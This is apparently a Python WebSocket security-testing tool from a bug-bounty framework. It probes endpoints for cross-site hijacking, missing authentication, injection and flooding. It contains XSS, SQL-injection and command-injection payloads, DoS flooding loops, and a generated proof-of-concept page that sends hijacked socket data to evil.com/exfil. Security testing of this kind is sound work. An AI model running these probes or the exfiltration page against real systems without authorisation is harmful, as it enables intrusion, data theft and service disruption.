"""
WebSocket Security Tester Agent

Comprehensive WebSocket security testing agent that identifies WebSocket-specific
vulnerabilities including Cross-Site WebSocket Hijacking (CSWSH), authentication bypass,
message injection, origin validation bypass, and denial-of-service attacks.

This agent tests for:
- Cross-Site WebSocket Hijacking (CSWSH)
- Missing Origin validation
- Authentication bypass (handshake and message-level)
- Message injection (XSS, SQLi, command injection)
- Information disclosure
- Denial of Service (subscription flooding, message flooding, connection exhaustion)
- WebSocket-specific protocol attacks

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import json
import time
import ssl
import re
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime, date
from enum import Enum
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style


try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Database integration
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


class WebSocketSeverity(Enum):
    """WebSocket vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class WebSocketVulnType(Enum):
    """Types of WebSocket vulnerabilities."""
    CSWSH = "CSWSH"
    MISSING_ORIGIN_VALIDATION = "MISSING_ORIGIN_VALIDATION"
    MISSING_AUTHENTICATION = "MISSING_AUTHENTICATION"
    MESSAGE_LEVEL_AUTH_MISSING = "MESSAGE_LEVEL_AUTH_MISSING"
    XSS_VIA_WEBSOCKET = "XSS_VIA_WEBSOCKET"
    SQLI_VIA_WEBSOCKET = "SQLI_VIA_WEBSOCKET"
    COMMAND_INJECTION = "COMMAND_INJECTION"
    TOKEN_IN_URL = "TOKEN_IN_URL"
    SUBSCRIPTION_FLOODING = "SUBSCRIPTION_FLOODING"
    MESSAGE_FLOODING = "MESSAGE_FLOODING"
    CONNECTION_EXHAUSTION = "CONNECTION_EXHAUSTION"
    INFORMATION_DISCLOSURE = "INFORMATION_DISCLOSURE"


@dataclass
class WebSocketFinding:
    """Represents a WebSocket security finding."""
    title: str
    severity: WebSocketSeverity
    vuln_type: WebSocketVulnType
    description: str
    ws_url: str
    poc: str = ""
    impact: str = ""
    recommendation: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        return {
            'title': self.title,
            'severity': self.severity.value,
            'vuln_type': self.vuln_type.value,
            'description': self.description,
            'ws_url': self.ws_url,
            'poc': self.poc,
            'impact': self.impact,
            'recommendation': self.recommendation,
            'evidence': self.evidence,
            'cwe_id': self.cwe_id,
            'discovered_date': self.discovered_date
        }


class WebSocketDetector:
    """Detect WebSocket endpoints and connection details."""

    COMMON_WS_PATHS = [
        '/ws',
        '/websocket',
        '/socket',
        '/socket.io',
        '/sockjs',
        '/api/ws',
        '/api/websocket',
        '/realtime',
        '/live',
        '/stream',
        '/notifications',
        '/chat',
        '/messages',
        '/updates',
        '/events'
    ]

    def __init__(self, target_url: str, timeout: int = 5):
        """
        Initialize WebSocket detector.

        Args:
            target_url: Base HTTP/HTTPS URL of the target
            timeout: Connection timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.ws_endpoints: List[str] = []
        self.connection_details: Dict[str, Dict] = {}

    def discover_websockets(self) -> List[str]:
        """
        Discover WebSocket endpoints.

        Returns:
            List of discovered WebSocket URLs
        """
        if not WEBSOCKET_AVAILABLE:
            return []

        print(f"\n{Fore.CYAN}[*] Discovering WebSocket endpoints on {self.target_url}{Style.RESET_ALL}")

        parsed_url = urlparse(self.target_url)
        base_domain = parsed_url.netloc
        scheme = 'wss' if parsed_url.scheme == 'https' else 'ws'

        # Test common paths
        for path in self.COMMON_WS_PATHS:
            ws_url = f"{scheme}://{base_domain}{path}"
            self._test_ws_endpoint(ws_url)

        # Scan JavaScript files for WebSocket URLs
        self._scan_javascript_for_ws()

        print(f"[*] Found {len(self.ws_endpoints)} WebSocket endpoint(s)")
        return self.ws_endpoints

    def _test_ws_endpoint(self, ws_url: str):
        """Test if a WebSocket endpoint is accessible."""
        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Found: {ws_url}")
            self.ws_endpoints.append(ws_url)

            # Store connection details
            self.connection_details[ws_url] = {
                'connected': True,
                'handshake': ws.getheaders() if hasattr(ws, 'getheaders') else {}
            }

            ws.close()

        except Exception:
            # Not a WebSocket endpoint or connection failed
            pass

    def _scan_javascript_for_ws(self):
        """Scan JavaScript files for WebSocket URLs."""
        if not REQUESTS_AVAILABLE:
            return

        try:
            response = requests.get(self.target_url, timeout=self.timeout, verify=False)

            # Find script tags
            script_urls = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', response.text)

            for script_url in script_urls[:10]:  # Limit to 10 scripts
                if not script_url.startswith('http'):
                    parsed = urlparse(self.target_url)
                    script_url = f"{parsed.scheme}://{parsed.netloc}{script_url}"

                try:
                    script_response = requests.get(script_url, timeout=self.timeout, verify=False)

                    # Look for WebSocket URLs
                    ws_patterns = [
                        r'(ws[s]?://[^\s\'"]+)',
                        r'new WebSocket\(["\']([^"\']+)["\']',
                        r'io\(["\']([^"\']+)["\']'  # socket.io
                    ]

                    for pattern in ws_patterns:
                        matches = re.findall(pattern, script_response.text)
                        for match in matches:
                            if match not in self.ws_endpoints and match.startswith('ws'):
                                print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Found in JS: {match}")
                                self.ws_endpoints.append(match)

                except Exception:
                    pass

        except Exception:
            pass


class WebSocketTester:
    """
    Comprehensive WebSocket security tester.

    Tests for CSWSH, authentication bypass, message injection, and DoS vulnerabilities.

    Usage:
        tester = WebSocketTester(target_url="https://example.com")
        findings = tester.run_all_tests()
    """

    def __init__(self, target_url: Optional[str] = None, ws_url: Optional[str] = None,
                 session_cookies: Optional[Dict[str, str]] = None,
                 target: Optional[str] = None, timeout: int = 5,
                 auto_discover: bool = True):
        """
        Initialize WebSocket tester.

        Args:
            target_url: HTTP/HTTPS base URL for discovery
            ws_url: Direct WebSocket URL to test (skips discovery)
            session_cookies: Session cookies for authenticated testing
            target: Target identifier for database tracking
            timeout: Connection timeout in seconds
            auto_discover: Auto-discover WebSocket endpoints
        """
        if not WEBSOCKET_AVAILABLE:
            raise ImportError("websocket-client library is required. Install with: pip install websocket-client")

        self.target_url = target_url
        self.session_cookies = session_cookies or {}
        self.timeout = timeout
        self.findings: List[WebSocketFinding] = []
        self.ws_endpoints: List[str] = []

        # Extract target for database tracking
        if target:
            self.target = target
        elif target_url:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"
        elif ws_url:
            parsed = urlparse(ws_url)
            self.target = parsed.netloc or "unknown-target"
        else:
            self.target = "unknown-target"

        # Auto-discover or use direct URL
        if ws_url:
            self.ws_endpoints = [ws_url]
        elif target_url and auto_discover:
            detector = WebSocketDetector(target_url, timeout)
            self.ws_endpoints = detector.discover_websockets()

    def run_all_tests(self) -> List[WebSocketFinding]:
        """
        Run all WebSocket security tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'websocket_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        if not self.ws_endpoints:
            print(f"{Fore.YELLOW}[!] No WebSocket endpoints found{Style.RESET_ALL}")
            return []

        print(f"\n{Fore.CYAN}[*] Starting WebSocket security testing...{Style.RESET_ALL}")
        print(f"[*] Testing {len(self.ws_endpoints)} endpoint(s)")

        start_time = time.time()

        # Test each endpoint
        for ws_url in self.ws_endpoints:
            print(f"\n{Fore.CYAN}[*] Testing: {ws_url}{Style.RESET_ALL}")

            # Run all test categories
            self._test_cswsh(ws_url)
            self._test_authentication(ws_url)
            self._test_message_injection(ws_url)
            self._test_dos(ws_url)
            self._test_token_in_url(ws_url)

        elapsed = time.time() - start_time

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'websocket_tester',
            findings_count=len(self.findings),
            duration_seconds=int(elapsed),
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [WebSocketSeverity.CRITICAL, WebSocketSeverity.HIGH]:
                if finding.evidence.get('payload'):
                    PayloadHooks.record_payload_success(
                        payload_text=finding.evidence['payload'],
                        vuln_type=finding.vuln_type.value,
                        context='websocket',
                        notes=finding.title
                    )

        print(f"\n{Fore.CYAN}=== WEBSOCKET TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Duration: {elapsed:.1f}s")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _test_cswsh(self, ws_url: str):
        """Test for Cross-Site WebSocket Hijacking."""
        print(f"  {Fore.YELLOW}Testing CSWSH...{Style.RESET_ALL}")

        evil_origins = [
            'https://evil.com',
            'http://evil.com',
            'null',
            ''
        ]

        for origin in evil_origins:
            try:
                # Build cookie header
                cookie_header = '; '.join([f'{k}={v}' for k, v in self.session_cookies.items()])

                # Try to connect with evil origin
                ws = websocket.create_connection(
                    ws_url,
                    timeout=self.timeout,
                    origin=origin if origin else None,
                    cookie=cookie_header if cookie_header else None,
                    sslopt={"cert_reqs": ssl.CERT_NONE}
                )

                # If connection succeeds, it's vulnerable
                poc_html = self._generate_cswsh_poc(ws_url)

                self.findings.append(WebSocketFinding(
                    title=f"Cross-Site WebSocket Hijacking (Origin: {origin or 'None'})",
                    severity=WebSocketSeverity.CRITICAL,
                    vuln_type=WebSocketVulnType.CSWSH,
                    description=(
                        f"WebSocket accepts connections from untrusted origin: '{origin}'. "
                        f"This allows Cross-Site WebSocket Hijacking attacks where an attacker "
                        f"can establish a WebSocket connection as the victim and read/send messages."
                    ),
                    ws_url=ws_url,
                    poc=poc_html,
                    impact=(
                        "An attacker can host a malicious website that establishes a WebSocket "
                        "connection using the victim's cookies. The attacker can then send and "
                        "receive messages as the victim, potentially stealing sensitive data or "
                        "performing actions on their behalf."
                    ),
                    recommendation=(
                        "Validate the Origin header in the WebSocket handshake. Only allow "
                        "connections from trusted origins. Implement a whitelist of allowed origins."
                    ),
                    evidence={'origin_tested': origin, 'connection_succeeded': True},
                    cwe_id="CWE-346"
                ))

                print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: Origin '{origin}' accepted")

                ws.close()
                return  # Only need to find one vulnerable origin

            except Exception:
                # Connection failed - good (origin validation working)
                pass

        print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: Origin validation enforced")

    def _test_authentication(self, ws_url: str):
        """Test WebSocket authentication vulnerabilities."""
        print(f"  {Fore.YELLOW}Testing authentication...{Style.RESET_ALL}")

        # Test 1: Missing authentication at handshake
        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            # Try to receive messages
            ws.settimeout(3)
            try:
                message = ws.recv()

                self.findings.append(WebSocketFinding(
                    title="WebSocket Missing Authentication",
                    severity=WebSocketSeverity.HIGH,
                    vuln_type=WebSocketVulnType.MISSING_AUTHENTICATION,
                    description=(
                        "WebSocket connection can be established without authentication. "
                        f"Received message: {message[:100]}"
                    ),
                    ws_url=ws_url,
                    poc=f"wscat -c {ws_url}",
                    impact="Unauthenticated access to WebSocket messages and functionality",
                    recommendation=(
                        "Require authentication during the WebSocket handshake. Validate "
                        "session cookies or tokens before accepting connections."
                    ),
                    evidence={'message_received': message[:200]},
                    cwe_id="CWE-306"
                ))

                print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: No authentication required")

            except Exception:
                print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: Connection requires authentication")

            ws.close()

        except Exception:
            print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: Authentication required at handshake")

        # Test 2: Message-level authentication
        self._test_message_level_auth(ws_url)

    def _test_message_level_auth(self, ws_url: str):
        """Test if authentication is only checked at message level."""
        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            # Try to send messages without auth
            test_messages = [
                '{"action": "get_user_data"}',
                '{"type": "subscribe", "channel": "private"}',
                '{"event": "message", "data": "test"}',
                '{"cmd": "get_balance"}',
            ]

            for msg in test_messages:
                ws.send(msg)

                try:
                    ws.settimeout(3)
                    response = ws.recv()

                    # Check if we got a valid response (not auth error)
                    if 'unauthorized' not in response.lower() and 'forbidden' not in response.lower():
                        self.findings.append(WebSocketFinding(
                            title="WebSocket Message-Level Auth Missing",
                            severity=WebSocketSeverity.HIGH,
                            vuln_type=WebSocketVulnType.MESSAGE_LEVEL_AUTH_MISSING,
                            description=(
                                f"WebSocket message processed without authentication. "
                                f"Sent: {msg}, Received: {response[:100]}"
                            ),
                            ws_url=ws_url,
                            poc=f"wscat -c {ws_url}\n> {msg}",
                            impact="Unauthenticated users can send messages and trigger actions",
                            recommendation=(
                                "Validate authentication for every message, not just at connection time"
                            ),
                            evidence={'request': msg, 'response': response[:200]},
                            cwe_id="CWE-306"
                        ))

                        print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: Message processed without auth")
                        break

                except Exception:
                    pass

            ws.close()

        except Exception:
            pass

    def _test_message_injection(self, ws_url: str):
        """Test message injection vulnerabilities."""
        print(f"  {Fore.YELLOW}Testing message injection...{Style.RESET_ALL}")

        # Test XSS
        self._test_xss_via_websocket(ws_url)

        # Test SQLi
        self._test_sqli_via_websocket(ws_url)

        # Test command injection
        self._test_command_injection(ws_url)

    def _test_xss_via_websocket(self, ws_url: str):
        """Test XSS via WebSocket messages."""
        xss_payloads = [
            '<script>document.title="XSS-FIRED"</script>',
            '<img src=x onerror="document.title=\'XSS-FIRED\'">',
            '"><script>document.title="XSS-FIRED"</script>',
            '\'; document.title="XSS-FIRED"; \'',
        ]

        try:
            cookie_header = '; '.join([f'{k}={v}' for k, v in self.session_cookies.items()])

            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                cookie=cookie_header if cookie_header else None,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            for payload in xss_payloads:
                # Test different message formats
                test_messages = [
                    json.dumps({'message': payload}),
                    json.dumps({'content': payload, 'type': 'message'}),
                    json.dumps({'action': 'send', 'data': payload}),
                    payload  # Raw payload
                ]

                for msg in test_messages:
                    ws.send(msg)

                    try:
                        ws.settimeout(3)
                        response = ws.recv()

                        # Check if payload reflected without encoding
                        if payload in response and '<' in response:
                            self.findings.append(WebSocketFinding(
                                title="XSS via WebSocket Message",
                                severity=WebSocketSeverity.HIGH,
                                vuln_type=WebSocketVulnType.XSS_VIA_WEBSOCKET,
                                description=(
                                    f"XSS payload reflected in WebSocket response without encoding. "
                                    f"Payload: {payload}"
                                ),
                                ws_url=ws_url,
                                poc=f"wscat -c {ws_url}\n> {msg}",
                                impact=(
                                    "Stored XSS if messages are persisted and displayed to other users. "
                                    "Can lead to session hijacking, data theft, or malicious actions."
                                ),
                                recommendation=(
                                    "Encode all user input before sending via WebSocket. Use HTML encoding "
                                    "on the client side before displaying WebSocket messages."
                                ),
                                evidence={'payload': payload, 'response': response[:200]},
                                cwe_id="CWE-79"
                            ))

                            print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: XSS payload reflected")
                            ws.close()
                            return

                    except Exception:
                        pass

            ws.close()

        except Exception:
            pass

    def _test_sqli_via_websocket(self, ws_url: str):
        """Test SQL injection via WebSocket parameters."""
        sqli_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
        ]

        try:
            cookie_header = '; '.join([f'{k}={v}' for k, v in self.session_cookies.items()])

            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                cookie=cookie_header if cookie_header else None,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            for payload in sqli_payloads:
                # Common parameters that might hit database
                test_messages = [
                    json.dumps({'user_id': payload}),
                    json.dumps({'action': 'get_user', 'id': payload}),
                    json.dumps({'query': payload}),
                ]

                for msg in test_messages:
                    start_time = time.time()
                    ws.send(msg)

                    try:
                        ws.settimeout(10)
                        response = ws.recv()
                        elapsed = time.time() - start_time

                        # Check for SQL errors
                        sql_errors = [
                            'sql syntax',
                            'mysql_fetch',
                            'ora-',
                            'postgresql',
                            'sqlite',
                            'syntax error'
                        ]

                        for error in sql_errors:
                            if error in response.lower():
                                self.findings.append(WebSocketFinding(
                                    title="SQL Injection via WebSocket",
                                    severity=WebSocketSeverity.CRITICAL,
                                    vuln_type=WebSocketVulnType.SQLI_VIA_WEBSOCKET,
                                    description=f"SQL error detected in WebSocket response: {error}",
                                    ws_url=ws_url,
                                    poc=f"wscat -c {ws_url}\n> {msg}",
                                    impact="Database compromise, data exfiltration, or data manipulation",
                                    recommendation=(
                                        "Use parameterized queries. Never concatenate user input into SQL queries."
                                    ),
                                    evidence={'payload': payload, 'error': error, 'response': response[:200]},
                                    cwe_id="CWE-89"
                                ))

                                print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: SQL error detected")
                                ws.close()
                                return

                        # Check for time-based SQLi
                        if 'SLEEP' in payload and elapsed >= 5:
                            self.findings.append(WebSocketFinding(
                                title="Time-Based SQL Injection via WebSocket",
                                severity=WebSocketSeverity.CRITICAL,
                                vuln_type=WebSocketVulnType.SQLI_VIA_WEBSOCKET,
                                description=f"Time-based SQLi detected (delay: {elapsed:.1f}s)",
                                ws_url=ws_url,
                                poc=f"wscat -c {ws_url}\n> {msg}",
                                impact="Blind SQL injection enabling database enumeration",
                                recommendation="Use parameterized queries",
                                evidence={'payload': payload, 'delay': f"{elapsed:.1f}s"},
                                cwe_id="CWE-89"
                            ))

                            print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: Time-based SQLi")
                            ws.close()
                            return

                    except Exception:
                        pass

            ws.close()

        except Exception:
            pass

    def _test_command_injection(self, ws_url: str):
        """Test command injection via WebSocket."""
        command_payloads = [
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
        ]

        try:
            cookie_header = '; '.join([f'{k}={v}' for k, v in self.session_cookies.items()])

            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                cookie=cookie_header if cookie_header else None,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            for payload in command_payloads:
                test_messages = [
                    json.dumps({'filename': f'test{payload}'}),
                    json.dumps({'action': 'process', 'input': payload}),
                ]

                for msg in test_messages:
                    start_time = time.time()
                    ws.send(msg)

                    try:
                        ws.settimeout(10)
                        response = ws.recv()
                        elapsed = time.time() - start_time

                        # Check for time delay (5+ seconds)
                        if elapsed >= 5:
                            self.findings.append(WebSocketFinding(
                                title="Command Injection via WebSocket",
                                severity=WebSocketSeverity.CRITICAL,
                                vuln_type=WebSocketVulnType.COMMAND_INJECTION,
                                description=f"Time-based command injection detected (delay: {elapsed:.1f}s)",
                                ws_url=ws_url,
                                poc=f"wscat -c {ws_url}\n> {msg}",
                                impact="Remote code execution on server",
                                recommendation=(
                                    "Never pass user input to system commands. Use safe APIs instead."
                                ),
                                evidence={'payload': payload, 'delay': f"{elapsed:.1f}s"},
                                cwe_id="CWE-78"
                            ))

                            print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: Command injection")
                            ws.close()
                            return

                    except Exception:
                        pass

            ws.close()

        except Exception:
            pass

    def _test_dos(self, ws_url: str):
        """Test WebSocket denial-of-service vulnerabilities."""
        print(f"  {Fore.YELLOW}Testing DoS...{Style.RESET_ALL}")

        # Test subscription flooding
        self._test_subscription_flooding(ws_url)

        # Test message flooding
        self._test_message_flooding(ws_url)

    def _test_subscription_flooding(self, ws_url: str):
        """Test subscription flooding DoS."""
        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            # Try to subscribe to many channels
            rate_limited = False
            for i in range(100):  # Reduced from 1000 for faster testing
                subscription_message = json.dumps({
                    'action': 'subscribe',
                    'channel': f'channel_{i}'
                })

                ws.send(subscription_message)

                # Check if we get rate limited
                if i % 10 == 0:
                    try:
                        ws.settimeout(1)
                        response = ws.recv()

                        if 'rate limit' in response.lower() or 'too many' in response.lower():
                            print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: Rate limited after {i} subscriptions")
                            rate_limited = True
                            break

                    except Exception:
                        pass

            if not rate_limited:
                self.findings.append(WebSocketFinding(
                    title="WebSocket Subscription Flooding",
                    severity=WebSocketSeverity.MEDIUM,
                    vuln_type=WebSocketVulnType.SUBSCRIPTION_FLOODING,
                    description="No rate limiting on WebSocket subscriptions",
                    ws_url=ws_url,
                    poc="Send 1000+ subscription requests without rate limiting",
                    impact="Resource exhaustion via subscription flooding",
                    recommendation="Implement rate limiting on subscriptions per connection",
                    evidence={'subscriptions_sent': 100},
                    cwe_id="CWE-770"
                ))

                print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: No subscription rate limiting")

            ws.close()

        except Exception:
            pass

    def _test_message_flooding(self, ws_url: str):
        """Test message flooding DoS."""
        try:
            ws = websocket.create_connection(
                ws_url,
                timeout=self.timeout,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            # Send many messages rapidly
            start_time = time.time()
            message_count = 0
            rate_limited = False

            for i in range(100):  # Reduced from 1000
                message = json.dumps({'test': f'message_{i}'})
                ws.send(message)
                message_count += 1

                # Check every 10 messages
                if i % 10 == 0:
                    try:
                        ws.settimeout(1)
                        response = ws.recv()

                        if 'rate limit' in response.lower():
                            elapsed = time.time() - start_time
                            print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: Rate limited after {message_count} messages")
                            rate_limited = True
                            break

                    except Exception:
                        pass

            elapsed = time.time() - start_time

            if not rate_limited:
                self.findings.append(WebSocketFinding(
                    title="WebSocket Message Flooding",
                    severity=WebSocketSeverity.MEDIUM,
                    vuln_type=WebSocketVulnType.MESSAGE_FLOODING,
                    description=f"Sent {message_count} messages in {elapsed:.1f}s without rate limiting",
                    ws_url=ws_url,
                    poc=f"Send {message_count} messages at {message_count/elapsed:.0f} msg/s",
                    impact="Server resource exhaustion",
                    recommendation="Implement rate limiting on messages per connection",
                    evidence={'message_count': message_count, 'elapsed': f"{elapsed:.1f}s"},
                    cwe_id="CWE-770"
                ))

                print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: No message rate limiting")

            ws.close()

        except Exception:
            pass

    def _test_token_in_url(self, ws_url: str):
        """Test if token is passed in WebSocket URL."""
        print(f"  {Fore.YELLOW}Testing token in URL...{Style.RESET_ALL}")

        # Check if WebSocket URL contains token parameter
        if '?' in ws_url:
            parsed = urlparse(ws_url)
            params = parse_qs(parsed.query)

            token_params = ['token', 'access_token', 'auth', 'key', 'session', 'jwt']

            for param in token_params:
                if param in params:
                    self.findings.append(WebSocketFinding(
                        title="WebSocket Token in URL",
                        severity=WebSocketSeverity.MEDIUM,
                        vuln_type=WebSocketVulnType.TOKEN_IN_URL,
                        description=f"WebSocket URL contains token in query parameter: {param}",
                        ws_url=ws_url,
                        poc=f"Token visible in: {ws_url}",
                        impact="Token exposure in logs, browser history, and Referer headers",
                        recommendation=(
                            "Pass authentication tokens via WebSocket headers or initial message, "
                            "not in the URL"
                        ),
                        evidence={'parameter': param},
                        cwe_id="CWE-598"
                    ))

                    print(f"    {Fore.RED}✗ VULNERABLE{Style.RESET_ALL}: Token found in URL ({param})")
                    return

        print(f"    {Fore.GREEN}✓ SECURE{Style.RESET_ALL}: No tokens in URL")

    def _generate_cswsh_poc(self, ws_url: str) -> str:
        """Generate CSWSH proof-of-concept HTML."""
        return f"""<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>Cross-Site WebSocket Hijacking</h1>
<p>This page demonstrates CSWSH vulnerability.</p>
<script>
// Victim's cookies are automatically sent with WebSocket handshake
const ws = new WebSocket('{ws_url}');

ws.onopen = () => {{
    console.log('WebSocket connection established with victim cookies');

    // Send commands as victim
    ws.send(JSON.stringify({{
        action: 'get_sensitive_data'
    }}));
}};

ws.onmessage = (event) => {{
    console.log('Received:', event.data);

    // Exfiltrate data to attacker server
    fetch('https://evil.com/exfil', {{
        method: 'POST',
        body: event.data
    }});
}};

ws.onerror = (error) => {{
    console.error('WebSocket error:', error);
}};
</script>
</body>
</html>"""

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] WEBSOCKET VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")

    def get_findings(self) -> List[WebSocketFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: WebSocketSeverity) -> List[WebSocketFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(WebSocketSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(WebSocketSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(WebSocketSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(WebSocketSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(WebSocketSeverity.INFO))
        }

        return {
            'target': self.target,
            'ws_endpoints': self.ws_endpoints,
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python websocket_tester.py <http_url_or_ws_url>")
        print("Example: python websocket_tester.py https://example.com")
        print("         python websocket_tester.py wss://example.com/ws")
        sys.exit(1)

    url = sys.argv[1]

    if url.startswith('ws://') or url.startswith('wss://'):
        tester = WebSocketTester(ws_url=url)
    else:
        tester = WebSocketTester(target_url=url)

    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Endpoints tested: {len(tester.ws_endpoints)}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] WebSocket vulnerabilities detected!{Style.RESET_ALL}")
        print("Review findings and validate manually.")


if __name__ == "__main__":
    main()
